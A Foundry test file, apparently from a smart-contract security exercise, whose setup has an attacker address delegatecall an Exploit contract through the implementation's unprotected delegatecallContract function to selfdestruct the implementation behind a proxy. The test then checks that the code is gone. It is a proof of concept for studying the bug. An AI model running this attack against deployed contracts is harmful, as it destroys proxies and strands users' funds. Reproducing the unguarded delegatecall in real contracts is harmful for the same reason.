// SPDX-License-Identifier: MIT
// NOTE: These contracts have a critical bug.
// DO NOT USE THIS IN PRODUCTION
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "forge-std/console2.sol";


import "../src/Proxy.sol";
import "../src/Implementation.sol";
import "../src/Exploit.sol";

contract SpearbitImplementationDestructTest is Test {
    Proxy public proxy;
    Implementation public impl;
    Exploit public exploit;

    // create fake addresses of the deployer and attacker
    address deployer = address(0x01);
    address attacker = address(0x02);

    function setUp() public {
        // Proxy and Implementation contracts deployment
        impl = new Implementation();
        proxy = new Proxy(address(impl), deployer);

        // send funds to deployer account
        (bool success,) = deployer.call{value: 1000 ether}("");
        if (!success){
            revert("Not deposited funds");
        }

        // Exploit contract deployment
        vm.startPrank(attacker);
        exploit = new Exploit();
        vm.stopPrank();

        // critical: The implementation deletion
        // Sets msg.sender for all subsequent calls until stopPrank is called.
        vm.startPrank(attacker);

        // pack calldata for Exploit contract
        bytes memory _calldataExploit = abi.encodeWithSelector(exploit.destroy.selector, attacker);
        // delete implementation contract through delegate call on the `selfdestruct`
        impl.delegatecallContract(address(exploit), _calldataExploit);

        vm.stopPrank();
        
    }

    function testImplementationDestruct() public {
        // verify that implementation contract is no longer existed; `false` -> contract does not exist; `true` -> contract exists
        bool result = _checkContractExistance(address(impl));
        console.log("Implementation contract exists: %s", result);
        
        assertEq(result, false);
    }
 
    function _checkContractExistance(address _contract) private view returns (bool){
        uint256 size;
        assembly {
            size := extcodesize(_contract)
        }
        return size != 0;
    }
}
